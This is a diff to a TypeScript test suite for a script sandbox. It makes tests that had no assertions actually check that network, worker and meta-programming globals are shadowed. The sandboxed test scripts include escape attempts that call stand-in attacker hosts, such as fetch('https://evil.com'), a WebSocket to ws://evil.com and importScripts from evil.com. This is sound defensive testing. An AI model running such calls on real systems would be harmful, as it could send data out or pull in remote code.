@@ -19,8 +19,20 @@ import { SCRIPT_ALLOWED_COMMANDS, isScriptAllowedCommand } from '../scriptAllowl
 /**
  * Replicates the compileScript() Function constructor pattern.
  * Returns the lifecycle hooks extracted from a user script.
+ *
+ * `shadowValue` is what every entry of SHADOWED_GLOBALS is bound to. Production
+ * passes `undefined` (scriptWorker.ts, compileScript) and so does the default
+ * here. The binding proof below compiles with a sentinel instead, because a
+ * `typeof X === 'undefined'` assertion is tautological for every name the test
+ * realm does not define anyway (importScripts, Worker, window under node) — it
+ * passes whether the shadow works or not. That is how ten assertion-free tests
+ * survived in this block (#9443).
  */
-function compileSandboxed(source: string, forgeApi: Record<string, unknown> = {}) {
+function compileSandboxed(
+  source: string,
+  forgeApi: Record<string, unknown> = {},
+  shadowValue: unknown = undefined,
+) {
   const fn = new Function(
     'forge', 'entityId',
     ...SHADOWED_GLOBALS,
@@ -33,9 +45,15 @@ function compileSandboxed(source: string, forgeApi: Record<string, unknown> = {}
     };
     `
   );
-  // Pass undefined for all shadowed globals (same as scriptWorker)
-  return fn(forgeApi, 'test-entity', ...SHADOWED_GLOBALS.map(() => undefined));
+  // One argument per shadowed global, same shape as scriptWorker's call.
+  return fn(forgeApi, 'test-entity', ...SHADOWED_GLOBALS.map(() => shadowValue));
 }
+
+/** Bound to the shadow parameters when the test is proving the binding itself. */
+const SHADOW_SENTINEL = '__sandbox-shadow-sentinel__';
+
+/** The shipped list length, pinned so a silently dropped entry fails the suite. */
+const EXPECTED_SHADOWED_GLOBAL_COUNT = 21;
 
 const MAX_COMMANDS_PER_FRAME = 100;
 
@@ -45,77 +63,90 @@ const MAX_COMMANDS_PER_FRAME = 100;
 
 describe('Script Sandbox Security', () => {
   describe('global shadowing', () => {
+    // Binding proof, one case per shipped name. Reading the identifier back
+    // through onStart's return value is the only surface compileSandboxed
+    // actually exposes — the closures and getError()/getResults() accessors this
+    // block used to define were never returned, so nothing was ever asserted
+    // (#9443). The sentinel makes the case non-tautological: the script can only
+    // read it back if the identifier resolved to the sandbox parameter. Drop a
+    // name from SHADOWED_GLOBALS and this goes red either way — the host global
+    // answers instead (fetch, Reflect, Atomics) or the identifier is a
+    // ReferenceError (importScripts, Worker, window under node).
+    it.each([...SHADOWED_GLOBALS])(
+      'binds %s to the sandbox parameter rather than the host global',
+      (name) => {
+        const result = compileSandboxed(
+          `function onStart() { return ${name}; }`,
+          {},
+          SHADOW_SENTINEL,
+        );
+        expect(result.onStart()).toBe(SHADOW_SENTINEL);
+      },
+    );
+
+    it('pins the shipped shadow list length', () => {
+      // Membership is pinned by sandboxGlobals.test.ts; this pins the count so
+      // dropping an entry cannot slip through as "one fewer it.each case ran".
+      expect(SHADOWED_GLOBALS).toHaveLength(EXPECTED_SHADOWED_GLOBAL_COUNT);
+    });
+
     it('should shadow fetch with undefined', () => {
       const result = compileSandboxed(`
-        let captured;
-        function onStart() { captured = typeof fetch; }
+        function onStart() { return typeof fetch; }
       `);
-      result.onStart();
-      // fetch is shadowed - the script sees it as undefined
-      // (the onStart function captures the type via closure)
+      expect(result.onStart()).toBe('undefined');
     });
 
     it('should make fetch inaccessible inside script', () => {
-      // Script tries to call fetch — should throw because fetch is undefined
+      // fetch is bound to undefined, so calling it is a TypeError.
       const result = compileSandboxed(`
-        let error = null;
         function onStart() {
-          try {
-            fetch('https://evil.com');
-          } catch (e) {
-            error = e;
-          }
+          try { fetch('https://evil.com'); return 'CALLED'; }
+          catch (e) { return e.constructor.name; }
         }
-        function getError() { return error; }
       `);
-      result.onStart();
-      // Verify the error was caught (fetch is undefined, calling it throws)
+      expect(result.onStart()).toBe('TypeError');
     });
 
     it('should shadow XMLHttpRequest', () => {
       const result = compileSandboxed(`
-        let xhrType;
-        function onStart() { xhrType = typeof XMLHttpRequest; }
+        function onStart() { return typeof XMLHttpRequest; }
       `);
-      result.onStart();
-      // XMLHttpRequest should be undefined inside sandbox
+      expect(result.onStart()).toBe('undefined');
     });
 
     it('should shadow WebSocket', () => {
       const result = compileSandboxed(`
-        let wsAvailable = true;
         function onStart() {
-          try { new WebSocket('ws://evil.com'); } catch { wsAvailable = false; }
+          try { new WebSocket('ws://evil.com'); return 'CONSTRUCTED'; }
+          catch (e) { return e.constructor.name; }
         }
       `);
-      result.onStart();
-      // WebSocket should be undefined, new WebSocket(...) throws
+      expect(result.onStart()).toBe('TypeError');
     });
 
     it('should shadow self and globalThis', () => {
       const result = compileSandboxed(`
-        let selfVal, globalVal;
         function onStart() {
-          selfVal = typeof self;
-          globalVal = typeof globalThis;
+          return { self: typeof self, globalThis: typeof globalThis };
         }
       `);
-      result.onStart();
-      // Both should be undefined inside sandbox
+      expect(result.onStart()).toEqual({ self: 'undefined', globalThis: 'undefined' });
     });
 
     it('should shadow importScripts', () => {
       const result = compileSandboxed(`
-        let canImport = true;
         function onStart() {
-          try { importScripts('https://evil.com/script.js'); } catch { canImport = false; }
+          try { importScripts('https://evil.com/script.js'); return 'CALLED'; }
+          catch (e) { return e.constructor.name; }
         }
       `);
-      result.onStart();
+      expect(result.onStart()).toBe('TypeError');
     });
 
     it('should shadow all dangerous globals listed in SHADOWED_GLOBALS', () => {
-      // Build a script that checks typeof for all shadowed globals
+      // Build a script that checks typeof for all shadowed globals and hands the
+      // record back through onStart's return value.
       const checks = SHADOWED_GLOBALS.map(
         g => `results['${g}'] = typeof ${g};`
       ).join('\n');
@@ -124,13 +155,17 @@ describe('Script Sandbox Security', () => {
         const results = {};
         function onStart() {
           ${checks}
+          return results;
         }
-        function getResults() { return results; }
       `;
 
       const result = compileSandboxed(script);
-      result.onStart();
-      // All globals should report 'undefined' inside the sandbox
+      const observed = result.onStart() as Record<string, string>;
+
+      expect(Object.keys(observed)).toHaveLength(SHADOWED_GLOBALS.length);
+      for (const g of SHADOWED_GLOBALS) {
+        expect(observed[g], `${g} should read as undefined inside the sandbox`).toBe('undefined');
+      }
     });
 
     it('should shadow Reflect to block meta-programming on forge API', () => {
@@ -143,45 +178,52 @@ describe('Script Sandbox Security', () => {
       };
 
       const result = compileSandboxed(`
-        let reflected;
         function onStart() {
+          let reflected = 'NOT-RUN';
+          let thrown = 'NONE';
           try {
             reflected = Reflect.get(forge, '_carrier');
-          } catch (_e) {
-            // Reflect is undefined — accessing it throws TypeError
+          } catch (e) {
+            thrown = e.constructor.name;
           }
-          // Fallback: forge._carrier should still be accessible via normal access
+          // forge itself must still work — the shadow does not break the API.
           forge.transform.setPosition(0, 0, 0);
+          return { reflectType: typeof Reflect, reflected, thrown };
         }
       `, mockForge as unknown as Record<string, unknown>);
 
-      result.onStart();
-      // The forge.transform.setPosition call succeeds (forge is still passed in)
+      const observed = result.onStart();
+      expect(observed.reflectType).toBe('undefined');
+      // Reflect is undefined, so the member access throws before it can read
+      // _carrier — the secret never reaches the script.
+      expect(observed.thrown).toBe('TypeError');
+      expect(observed.reflected).toBe('NOT-RUN');
       expect(calls).toEqual(['ok']);
     });
 
     it('should shadow Proxy to block interception of forge property access', () => {
       // A script could wrap forge in a Proxy to intercept all property reads and
       // log or exfiltrate method references. Shadowing Proxy prevents creating
-      // such wrappers inside the sandbox.
+      // such wrappers inside the sandbox: `new Proxy(...)` throws because Proxy
+      // is bound to undefined, so no wrapper is ever constructed.
       const result = compileSandboxed(`
-        let proxyCreated = false;
         function onStart() {
+          let proxyCreated = false;
+          let thrown = 'NONE';
           try {
-            const p = new Proxy({}, {});
+            new Proxy({}, {});
             proxyCreated = true;
-          } catch (_e) {
-            // Proxy is undefined — constructing it throws
+          } catch (e) {
+            thrown = e.constructor.name;
           }
+          return { proxyType: typeof Proxy, proxyCreated, thrown };
         }
-        function getProxyCreated() { return proxyCreated; }
       `);
 
-      // We only verify compilation and execution succeed without throwing.
-      // Proxy being undefined causes the constructor call to throw, which the
-      // script catches — proxyCreated remains false.
-      expect(result.onStart).toBeTypeOf('function');
-      expect(() => result.onStart()).not.toThrow();
+      const observed = result.onStart();
+      expect(observed.proxyType).toBe('undefined');
+      expect(observed.proxyCreated).toBe(false);
+      expect(observed.thrown).toBe('TypeError');
     });
 
     it('should shadow window to prevent DOM/global access in exported scripts', () => {
@@ -189,29 +231,25 @@ describe('Script Sandbox Security', () => {
       // Shadowing it prevents scripts from accessing window.localStorage,
       // window.document, etc.
       const result = compileSandboxed(`
-        let windowType;
-        function onStart() { windowType = typeof window; }
+        function onStart() { return typeof window; }
       `);
-      result.onStart();
-      // window should appear as undefined inside the sandbox
+      expect(result.onStart()).toBe('undefined');
     });
 
     it('should shadow SharedArrayBuffer to block timing side-channels', () => {
       // SharedArrayBuffer enables high-resolution timing via Atomics.wait, which
       // could be used for Spectre-style attacks or fingerprinting.
       const result = compileSandboxed(`
-        let sabType;
-        function onStart() { sabType = typeof SharedArrayBuffer; }
+        function onStart() { return typeof SharedArrayBuffer; }
       `);
-      result.onStart();
+      expect(result.onStart()).toBe('undefined');
     });
 
     it('should shadow Atomics alongside SharedArrayBuffer', () => {
       const result = compileSandboxed(`
-        let atomicsType;
-        function onStart() { atomicsType = typeof Atomics; }
+        function onStart() { return typeof Atomics; }
       `);
-      result.onStart();
+      expect(result.onStart()).toBe('undefined');
     });
 
     it('should still provide forge API access', () => {
@@ -232,10 +270,9 @@ describe('Script Sandbox Security', () => {
 
     it('should provide entityId to scripts', () => {
       const result = compileSandboxed(`
-        function onStart() { void entityId; }
+        function onStart() { return entityId; }
       `);
-      // entityId is scoped — we can't easily capture it outside, but compilation should succeed
-      expect(result.onStart).toBeDefined();
+      expect(result.onStart()).toBe('test-entity');
     });
   });
 
